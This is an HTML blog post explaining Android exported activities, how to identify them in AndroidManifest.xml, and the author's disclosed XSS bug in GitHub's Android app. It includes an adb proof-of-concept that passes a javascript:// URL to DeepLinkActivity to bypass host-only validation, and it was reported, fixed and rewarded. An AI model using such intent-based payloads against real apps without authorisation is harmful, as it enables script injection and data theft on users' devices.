<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Exploiting Exported activities in Android apps | mzfr's Blog</title><meta name=keywords content="Android"><meta name=description content="This blog post doesn&rsquo;t teach you the very basics of the android app, it just talks about the exported activity and their exploitation"><meta name=author content><link rel=canonical href=https://blog.mzfr.me/posts/2020-11-07-exported-activities/><link href=https://blog.mzfr.me/assets/css/stylesheet.min.9b41f1fca0ecd98165aaa98ef85e6717a95f6621f6190ac064cd8c42a8334c28.css integrity="sha256-m0Hx/KDs2YFlqqmO+F5nF6lfZiH2GQrAZM2MQqgzTCg=" rel="preload stylesheet" as=style><link rel=icon href=https://blog.mzfr.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.mzfr.me/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.mzfr.me/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.mzfr.me/apple-touch-icon.png><link rel=mask-icon href=https://blog.mzfr.me/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.79.0"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.1/styles/solarized-dark.min.css integrity="sha512-H+WY7zsI0kQwkbYE+yp/9vg/UzpiyuKERzpxOaGwKCc7iFoNpi0h3mQ4GpZMO9lDaVzc1xjD3e6g/UMuUlOicg==" crossorigin=anonymous><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-147356794-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><meta property="og:title" content="Exploiting Exported activities in Android apps"><meta property="og:description" content="This blog post doesn&rsquo;t teach you the very basics of the android app, it just talks about the exported activity and their exploitation"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.mzfr.me/posts/2020-11-07-exported-activities/"><meta property="article:published_time" content="2020-11-07T00:00:00+00:00"><meta property="article:modified_time" content="2020-11-07T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Exploiting Exported activities in Android apps"><meta name=twitter:description content="This blog post doesn&rsquo;t teach you the very basics of the android app, it just talks about the exported activity and their exploitation"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Exploiting Exported activities in Android apps","name":"Exploiting Exported activities in Android apps","description":"This blog post doesn\u0026amp;rsquo;t teach you the very basics of the android app, it just talks about the exported activity and their exploitation","keywords":["Android"],"articleBody":"This blog post doesnâ€™t teach you the very basics of the android app, it just talks about the exported activity and their exploitation. If you have no idea what an apk is, how to extract the apk etc then I would suggest you go through the following resources:\n Intro to Android Hacking - Blog Post Diary of Inexperienced Bug Hunter - Video  These resources will give some ideas about the anatomy and working of APK.\nWhat is an activity in the Android app? Everything that you see in an android app is kind of being done via an activity. For example, say you click on the Facebook app icon in your phone, it will show a window with your feed, but internally system has started a Launcher activity whose job is to show you data in a certain format and also provide you options to move to other activities like seeing notifications or your messages.\nAccording to Android developer docs, An activity is a single, focused thing that the user can do.\nYou can read more about android activities here and here.\nWhat is exported activity? An exported activity is the one that can be accessed by external components or apps. We can say that exported activities are like Public functions in Java, any other parent class or even package can call them.\nLetâ€™s understand this with an example, say you are on your home screen and now you want to start the Twitter app so youâ€™ll click on the app icon to invoke its launcher activity but technically you were already in some activity(home page) and then you started another activity(launching the Twitter app). Now if the launcher activity of the Twitter app isnâ€™t exported(not public) then no one will be able to invoke the activity and the app wonâ€™t start. That is why there has to at least one activity exported so other components of android can start it.\nWhy exported activities can be bad? We saw that exported activities are useful since they help in starting the app and provides other functionalities so what could possibly be wrong with them?\nWell, the thing is that having activities isnâ€™t wrong at all but having exported activities without any kind of protection can be bad. Because any malicious app can invoke those activities for performing various malicious actions.\nHow can we define an activity in the app? In all the android app there is a file called AndroidManifest.xml. Example of a defined activity can be seen below:\n android:theme=\"@style/NoDisplayTheme\" android:name=\"com.github.android.activities.DeepLinkActivity\" android:launchMode=\"singleTask\"   android:name=\"android.intent.action.VIEW\"/  android:name=\"android.intent.category.DEFAULT\"/  android:name=\"android.intent.category.BROWSABLE\"/  android:scheme=\"https\"/  android:host=\"github.com\"/  android:pathPattern=\"/.*\"/   This is an activity defined in Github's android app.\nAs you can see above name of the activity is com.github.android.activities.DeepLinkActivity, this name is selected based on the directory a file is present in. So that name resembles that there is a file named DeepLinkActivity.java in the directory com/github/android/activities.\nThose launchMode and theme doesnâ€™t matter, ignore them like The Dictator ignores Larry Kingâ€™s question about nuclear weapons\nNow everything in the  is important and can help us in the exploitation part. Letâ€™s look at them one by one:\n action - As the word says it let the activity know what kind of action has to be taken when that activity is started. So that means a single activity can have multiple actions defined. category - TBH I donâ€™t know what it does, I never got around to understand the role of the category tag in intent-filters so I guess we can ignore them ðŸ˜œ data - This is the data that is to be given to the activity for some kind of processing. In our example, we see 3 data tags but each having different attributes and they are kind of self-explanatory. All those tags say that our DeepLinkActivity takes data of the format https://github.com/*.  How to identify an exported activity? According to the android developer docs, an activity is considered exported in the following two cases:\n If the activity has android:exported=\"true\" attribute in its definition. If android:exported is not defined at all then it should have at least one intent-filter in it.  Again letâ€™s understand this with an example.\n  An exported activity:\n android:name=\"com.github.android.activities.DeepLinkActivity\" android:exported=\"true\"  Just set the android:exported=\"true\"\n  Another way to export an activity:\n android:name=\"com.github.android.activities.DeepLinkActivity\"   android:name=\"android.intent.action.VIEW\"/  android:name=\"android.intent.category.DEFAULT\"/  android:name=\"android.intent.category.BROWSABLE\"/  android:scheme=\"https://*\"/   We can see that even though we didnâ€™t set the android:exported attribute at all but still this will be considered exported because this activity has intent-filter defined.\n  An unexported activity:\n android:name=\"com.github.android.activities.DeepLinkActivity\"  Here the attribute isnâ€™t defined but since there is not a single intent-filter this will be considered as not an exported activity.\nIf we want an activity with intent-filters but doesnâ€™t want it to be exported we can use:\n android:name=\"com.github.android.activities.DeepLinkActivity\" android:exported=\"false\"   android:name=\"android.intent.action.VIEW\"/  android:name=\"android.intent.category.DEFAULT\"/  android:name=\"android.intent.category.BROWSABLE\"/  android:scheme=\"https://*\"/     Manually finding the exported activity is good when you are trying to learn stuff but once you are good with it you can use tools like drozer or if you want you can use a tool that I made called slicer.\nWhat are the possible attacks that can be done using exported activities? Some common attacks would be to get an XSS in the android webview(in-app browser), open redirect(via the app take the user to some malicious URL).\nOther than this it depends upon the functionality of the activity. If the activity is responsible for downloading a file in the app then it might be possible to download malicious stuff, if the activity is responsible for reading a given file then it might be possible to read the internal sensitive data of the app(user token etc)\nBelow is the list of all the @bagipro disclosed report which uses exported activities for exploiting different features:\n Opening arbitrary URLs/XSS in SAMLAuthActivity Possible to steal any protected files on Android Access of Android protected components via embedded intent Theft of arbitrary files leading to token leakage XSS in ImageViewerActivity  A bug that I found I found an XSS bug in Github's android app and that issue was in the same exported activity which we have used till now as an example ðŸ˜„.\n android:theme=\"@style/NoDisplayTheme\" android:name=\"com.github.android.activities.DeepLinkActivity\" android:launchMode=\"singleTask\"   android:name=\"android.intent.action.VIEW\"/  android:name=\"android.intent.category.DEFAULT\"/  android:name=\"android.intent.category.BROWSABLE\"/  android:scheme=\"http\"/  android:scheme=\"https\"/  android:host=\"github.com\"/  android:pathPattern=\"/.*\"/   This activity had the following code:\npublic final void G0(Intent intent) { String str; Uri data = intent != null ? intent.getData() : null; if (!a.d.d()) { B0(); if (data != null) { .... .... String host = data.getHost(); .... .... boolean z = false; if (j.a(str, \"github.com\") || h.d(str, \".github.com\", false, 2)) { z = true; } if (z) { g.a.a.x.j.c(this, data); return; } .... What this code is doing is checking if the data to activity was provided if not stop the activity. If yes then getHost and check if the host matches with github.com or .github.com. If yes then open that URL in the webview.\nNow @bagipro has a golden technique to bypass host validation but that didnâ€™t work for me. But also if you scroll a bit down in that report he suggests the scheme validation. And I noticed that even though the host validation was present in code they werenâ€™t checking for the scheme so I decided to use javascript:// and my exploitation script looked like:\n#!/bin/bash  path=\"$(printf '%s' 'javascript://github.com/%0aalert\\(\\\"mzfr\\\"\\)')\" adb shell am start -a android.intent.action.VIEW -n com.github.android/.activities.DeepLinkActivity -d $path And we got ourselves an alert:\nTimeline  September 30 - Reported the XSS to Github via HackerOne October 1 - Report triaged October 14 - New Version released and Fix confirmed October 15 - $1000 bounty + swags awarded  ","wordCount":"1277","inLanguage":"en","datePublished":"2020-11-07T00:00:00Z","dateModified":"2020-11-07T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.mzfr.me/posts/2020-11-07-exported-activities/"},"publisher":{"@type":"Organization","name":"mzfr's Blog","logo":{"@type":"ImageObject","url":"https://blog.mzfr.me/favicon.ico"}}}</script></head><body><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><noscript><style type=text/css>.theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://blog.mzfr.me accesskey=h>mzfr's Blog</a>
<span class=logo-switches><span class=theme-toggle><a id=theme-toggle accesskey=t><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></span></span></div><ul class=menu id=menu onscroll=menu_on_scroll()><li><a href=https://blog.mzfr.me/><span>Home</span></a></li><li><a href=https://blog.mzfr.me/posts/><span>Blog</span></a></li><li><a href=https://blog.mzfr.me/about/><span>About</span></a></li><li><a href=https://blog.mzfr.me/htb/><span>HTB</span></a></li><li><a href=https://mzfr.gitbook.io/notes/><span>Notes</span></a></li><li><a href=https://blog.mzfr.me/vulnhub/><span>Vulnhub</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Exploiting Exported activities in Android apps</h1><div class=post-meta>November 7, 2020&nbsp;Â·&nbsp;6 min</div></header><div class=post-content><p>This blog post doesn&rsquo;t teach you the very basics of the android app, it just talks about the exported activity and their exploitation. If you have no idea what an apk is, how to extract the apk etc then I would suggest you go through the following resources:</p><ul><li><a href=https://www.hackerone.com/blog/androidhackingmonth-intro-to-android-hacking>Intro to Android Hacking</a> - Blog Post</li><li><a href=https://www.bugcrowd.com/resources/webinars/the-diary-of-an-inexperienced-bug-hunter-intro-to-android-hacking/>Diary of Inexperienced Bug Hunter</a> - Video</li></ul><p>These resources will give some ideas about the anatomy and working of APK.</p><h3 id=what-is-an-activity-in-the-android-app>What is an activity in the Android app?<a hidden class=anchor aria-hidden=true href=#what-is-an-activity-in-the-android-app>#</a></h3><p>Everything that you see in an android app is kind of being done via an activity. For example, say you click on the Facebook app icon in your phone, it will show a window with your feed, but internally system has started a <code>Launcher activity</code> whose job is to show you data in a certain format and also provide you options to move to other activities like seeing notifications or your messages.</p><p>According to Android developer docs, <code>An activity is a single, focused thing that the user can do</code>.</p><p>You can read more about android activities <a href=https://www.tutorialspoint.com/android/android_acitivities.htm>here</a> and <a href=https://developer.android.com/reference/android/app/Activity>here</a>.</p><h3 id=what-is-exported-activity>What is exported activity?<a hidden class=anchor aria-hidden=true href=#what-is-exported-activity>#</a></h3><p>An exported activity is the one that can be accessed by external components or apps. We can say that exported activities are like <code>Public</code> functions in Java, any other parent class or even package can call them.</p><p>Let&rsquo;s understand this with an example, say you are on your home screen and now you want to start the Twitter app so you&rsquo;ll click on the app icon to invoke its launcher activity but technically you were already in some activity(home page) and then you started another activity(launching the Twitter app). Now if the <code>launcher</code> activity of the Twitter app isn&rsquo;t exported(not public) then no one will be able to invoke the activity and the app won&rsquo;t start. That is why there has to at least one activity exported so other components of android can start it.</p><h3 id=why-exported-activities-can-be-bad>Why exported activities can be bad?<a hidden class=anchor aria-hidden=true href=#why-exported-activities-can-be-bad>#</a></h3><p>We saw that exported activities are useful since they help in starting the app and provides other functionalities so what could possibly be wrong with them?</p><p>Well, the thing is that having activities isn&rsquo;t wrong at all but having exported activities without any kind of protection can be bad. Because any malicious app can invoke those activities for performing various malicious actions.</p><h3 id=how-can-we-define-an-activity-in-the-app>How can we define an activity in the app?<a hidden class=anchor aria-hidden=true href=#how-can-we-define-an-activity-in-the-app>#</a></h3><p>In all the android app there is a file called <code>AndroidManifest.xml</code>. Example of a defined activity can be seen below:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:theme=</span><span style=color:#e6db74>&#34;@style/NoDisplayTheme&#34;</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.github.android.activities.DeepLinkActivity&#34;</span> <span style=color:#a6e22e>android:launchMode=</span><span style=color:#e6db74>&#34;singleTask&#34;</span><span style=color:#f92672>&gt;</span>
    <span style=color:#f92672>&lt;intent-filter&gt;</span>
        <span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.action.VIEW&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.DEFAULT&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.BROWSABLE&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;data</span> <span style=color:#a6e22e>android:scheme=</span><span style=color:#e6db74>&#34;https&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;data</span> <span style=color:#a6e22e>android:host=</span><span style=color:#e6db74>&#34;github.com&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;data</span> <span style=color:#a6e22e>android:pathPattern=</span><span style=color:#e6db74>&#34;/.*&#34;</span><span style=color:#f92672>/&gt;</span>
    <span style=color:#f92672>&lt;/intent-filter&gt;</span>
<span style=color:#f92672>&lt;/activity&gt;</span>
</code></pre></div><p>This is an activity defined in <code>Github's</code> android app.</p><p>As you can see above <code>name</code> of the activity is <code>com.github.android.activities.DeepLinkActivity</code>, this name is selected based on the directory a file is present in. So that name resembles that there is a file named <code>DeepLinkActivity.java</code> in the directory <code>com/github/android/activities</code>.</p><p>Those launchMode and theme doesn&rsquo;t matter, ignore them like <a href="https://youtu.be/qqa7YhsroW8?t=100">The Dictator ignores Larry King&rsquo;s question about nuclear weapons</a></p><p>Now everything in the <code>&lt;intent-filter></code> is important and can help us in the exploitation part. Let&rsquo;s look at them one by one:</p><ul><li><code>action</code> - As the word says it let the activity know what kind of action has to be taken when that activity is started. So that means a single activity can have multiple actions defined.</li><li><code>category</code> - TBH I don&rsquo;t know what it does, I never got around to understand the role of the <code>category</code> tag in <code>intent-filters</code> so I guess we can ignore them ðŸ˜œ</li><li><code>data</code> - This is the data that is to be given to the activity for some kind of processing. In our example, we see 3 data tags but each having different attributes and they are kind of self-explanatory. All those tags say that our <code>DeepLinkActivity</code> takes data of the format <code>https://github.com/*</code>.</li></ul><h3 id=how-to-identify-an-exported-activity>How to identify an exported activity?<a hidden class=anchor aria-hidden=true href=#how-to-identify-an-exported-activity>#</a></h3><p>According to the android developer docs, an activity is considered exported in the following two cases:</p><ul><li>If the activity has<code> android:exported="true"</code> attribute in its definition.</li><li>If <code>android:exported</code> is not defined at all then it should have at least one <code>intent-filter</code> in it.</li></ul><p>Again let&rsquo;s understand this with an example.</p><ul><li><p>An exported activity:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.github.android.activities.DeepLinkActivity&#34;</span> <span style=color:#a6e22e>android:exported=</span><span style=color:#e6db74>&#34;true&#34;</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;/activity&gt;</span>
</code></pre></div><p>Just set the <code>android:exported="true"</code></p></li><li><p>Another way to export an activity:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.github.android.activities.DeepLinkActivity&#34;</span><span style=color:#f92672>&gt;</span>
    <span style=color:#f92672>&lt;intent-filter&gt;</span>
        <span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.action.VIEW&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.DEFAULT&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.BROWSABLE&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;data</span> <span style=color:#a6e22e>android:scheme=</span><span style=color:#e6db74>&#34;https://*&#34;</span><span style=color:#f92672>/&gt;</span>
<span style=color:#f92672>&lt;/intent-filter&gt;</span>
<span style=color:#f92672>&lt;/activity&gt;</span>
</code></pre></div><p>We can see that even though we didn&rsquo;t set the <code>android:exported</code> attribute at all but still this will be considered exported because this activity has <code>intent-filter</code> defined.</p></li><li><p>An unexported activity:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.github.android.activities.DeepLinkActivity&#34;</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;/activity&gt;</span>
</code></pre></div><p>Here the attribute isn&rsquo;t defined but since there is not a single <code>intent-filter</code> this will be considered as <code>not an exported activity</code>.</p><p>If we want an activity with <code>intent-filters</code> but doesn&rsquo;t want it to be exported we can use:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.github.android.activities.DeepLinkActivity&#34;</span> <span style=color:#a6e22e>android:exported=</span><span style=color:#e6db74>&#34;false&#34;</span><span style=color:#f92672>&gt;</span>
    <span style=color:#f92672>&lt;intent-filter&gt;</span>
        <span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.action.VIEW&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.DEFAULT&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.BROWSABLE&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;data</span> <span style=color:#a6e22e>android:scheme=</span><span style=color:#e6db74>&#34;https://*&#34;</span><span style=color:#f92672>/&gt;</span>
<span style=color:#f92672>&lt;/intent-filter&gt;</span>
<span style=color:#f92672>&lt;/activity&gt;</span>
</code></pre></div></li></ul><p>Manually finding the exported activity is good when you are trying to learn stuff but once you are good with it you can use tools like <a href=https://github.com/FSecureLABS/drozer><code>drozer</code></a> or if you want you can use a tool that I made called <a href=https://github.com/mzfr/slicer><code>slicer</code></a>.</p><h3 id=what-are-the-possible-attacks-that-can-be-done-using-exported-activities>What are the possible attacks that can be done using exported activities?<a hidden class=anchor aria-hidden=true href=#what-are-the-possible-attacks-that-can-be-done-using-exported-activities>#</a></h3><p>Some common attacks would be to get an <code>XSS</code> in the android webview(in-app browser), open redirect(via the app take the user to some malicious URL).</p><p>Other than this it depends upon the functionality of the activity. If the activity is responsible for downloading a file in the app then it might be possible to download malicious stuff, if the activity is responsible for reading a given file then it might be possible to read the internal sensitive data of the app(user token etc)</p><p>Below is the list of all the <a href=https://twitter.com/_bagipro>@bagipro</a> disclosed report which uses exported activities for exploiting different features:</p><ul><li><a href=https://hackerone.com/reports/283058>Opening arbitrary URLs/XSS in SAMLAuthActivity</a></li><li><a href=https://hackerone.com/reports/161710>Possible to steal any protected files on Android</a></li><li><a href=https://hackerone.com/reports/200427>Access of Android protected components via embedded intent</a></li><li><a href=https://hackerone.com/reports/288955>Theft of arbitrary files leading to token leakage</a></li><li><a href=https://hackerone.com/reports/283063>XSS in ImageViewerActivity</a></li></ul><h2 id=a-bug-that-i-found>A bug that I found<a hidden class=anchor aria-hidden=true href=#a-bug-that-i-found>#</a></h2><p>I found an XSS bug in <code>Github's</code> android app and that issue was in the same exported activity which we have used till now as an example ðŸ˜„.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:theme=</span><span style=color:#e6db74>&#34;@style/NoDisplayTheme&#34;</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.github.android.activities.DeepLinkActivity&#34;</span> <span style=color:#a6e22e>android:launchMode=</span><span style=color:#e6db74>&#34;singleTask&#34;</span><span style=color:#f92672>&gt;</span>
        <span style=color:#f92672>&lt;intent-filter&gt;</span>
            <span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.action.VIEW&#34;</span><span style=color:#f92672>/&gt;</span>
            <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.DEFAULT&#34;</span><span style=color:#f92672>/&gt;</span>
            <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.BROWSABLE&#34;</span><span style=color:#f92672>/&gt;</span>
            <span style=color:#f92672>&lt;data</span> <span style=color:#a6e22e>android:scheme=</span><span style=color:#e6db74>&#34;http&#34;</span><span style=color:#f92672>/&gt;</span>
            <span style=color:#f92672>&lt;data</span> <span style=color:#a6e22e>android:scheme=</span><span style=color:#e6db74>&#34;https&#34;</span><span style=color:#f92672>/&gt;</span>
            <span style=color:#f92672>&lt;data</span> <span style=color:#a6e22e>android:host=</span><span style=color:#e6db74>&#34;github.com&#34;</span><span style=color:#f92672>/&gt;</span>
            <span style=color:#f92672>&lt;data</span> <span style=color:#a6e22e>android:pathPattern=</span><span style=color:#e6db74>&#34;/.*&#34;</span><span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;/intent-filter&gt;</span>
<span style=color:#f92672>&lt;/activity&gt;</span>
</code></pre></div><p>This activity had the following code:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>G0</span><span style=color:#f92672>(</span>Intent intent<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        String str<span style=color:#f92672>;</span>
        Uri data <span style=color:#f92672>=</span> intent <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> intent<span style=color:#f92672>.</span><span style=color:#a6e22e>getData</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!</span>a<span style=color:#f92672>.</span><span style=color:#a6e22e>d</span><span style=color:#f92672>.</span><span style=color:#a6e22e>d</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span>
            B0<span style=color:#f92672>();</span>
            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>data <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
                <span style=color:#f92672>....</span>
                <span style=color:#f92672>....</span>
                String host <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span><span style=color:#a6e22e>getHost</span><span style=color:#f92672>();</span>
                <span style=color:#f92672>....</span>
                <span style=color:#f92672>....</span>
                <span style=color:#66d9ef>boolean</span> z <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>j<span style=color:#f92672>.</span><span style=color:#a6e22e>a</span><span style=color:#f92672>(</span>str<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;github.com&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span> h<span style=color:#f92672>.</span><span style=color:#a6e22e>d</span><span style=color:#f92672>(</span>str<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;.github.com&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>,</span> 2<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
                    z <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
                <span style=color:#f92672>}</span>
                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>z<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
                    g<span style=color:#f92672>.</span><span style=color:#a6e22e>a</span><span style=color:#f92672>.</span><span style=color:#a6e22e>a</span><span style=color:#f92672>.</span><span style=color:#a6e22e>x</span><span style=color:#f92672>.</span><span style=color:#a6e22e>j</span><span style=color:#f92672>.</span><span style=color:#a6e22e>c</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>,</span> data<span style=color:#f92672>);</span>
                    <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
                <span style=color:#f92672>}</span>
                <span style=color:#f92672>....</span>
</code></pre></div><p>What this code is doing is checking if the <code>data</code> to activity was provided if not stop the activity. If yes then <code>getHost</code> and check if the host matches with <code>github.com</code> or <code>.github.com</code>. If yes then open that URL in the webview.</p><p>Now <a href=https://hackerone.com/bagipro>@bagipro</a> has a <a href=https://hackerone.com/reports/431002>golden technique to bypass host validation</a> but that didn&rsquo;t work for me. But also if you scroll a bit down in that report he suggests the <code>scheme</code> validation. And I noticed that even though the host validation was present in code they weren&rsquo;t checking for the scheme so I decided to use <code>javascript://</code> and my exploitation script looked like:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
path<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>printf <span style=color:#e6db74>&#39;%s&#39;</span> <span style=color:#e6db74>&#39;javascript://github.com/%0aalert\(\&#34;mzfr\&#34;\)&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>

adb shell am start -a android.intent.action.VIEW -n com.github.android/.activities.DeepLinkActivity -d $path
</code></pre></div><p>And we got ourselves an alert:</p><p><img src=/images/pop.png alt=alert></p><h3 id=timeline>Timeline<a hidden class=anchor aria-hidden=true href=#timeline>#</a></h3><ul><li>September 30 - Reported the XSS to Github via HackerOne</li><li>October 1 - Report triaged</li><li>October 14 - New Version released and Fix confirmed</li><li>October 15 - $1000 bounty + swags awarded</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.mzfr.me/tags/android>Android</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2020 <a href=https://blog.mzfr.me>mzfr's Blog</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
<span>&#183;</span>
<span>Theme <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><button class=top-link id=top-link type=button aria-label="go to top" title="Go to Top" accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6"><path d="M12 6H0l6-6z"/></svg></button>
<script defer src=https://blog.mzfr.me/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w=" onload=hljs.initHighlightingOnLoad();></script><script>window.onload=function(){if(localStorage.getItem("menu-scroll-position")){document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position");}}
